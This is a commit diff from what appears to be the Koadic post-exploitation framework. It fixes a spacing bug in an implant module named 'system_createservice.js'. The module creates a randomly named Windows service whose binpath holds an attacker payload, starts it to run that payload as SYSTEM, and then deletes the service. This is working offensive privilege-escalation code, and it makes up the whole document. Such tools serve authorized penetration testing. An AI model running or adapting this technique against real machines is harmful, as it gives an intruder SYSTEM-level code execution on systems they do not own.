e5864c8d42a11946fe150c87582922e9590892ee
TheNaterz <nate.caroe@risksense.com>
2019-10-04 11:47:13 -0600

    needed to add a space after binpath=

--- data/implant/elevate/system_createservice.js
+++ data/implant/elevate/system_createservice.js
@@ -1,6 +1,6 @@
 try
 {
-    Koadic.shell.run("sc create #random# binpath=\"~PAYLOAD_DATA~\"", true);
+    Koadic.shell.run("sc create #random# binpath= \"~PAYLOAD_DATA~\"", true);
     Koadic.shell.run("sc start #random#", true);
     Koadic.shell.run("sc delete #random#", true);
 }
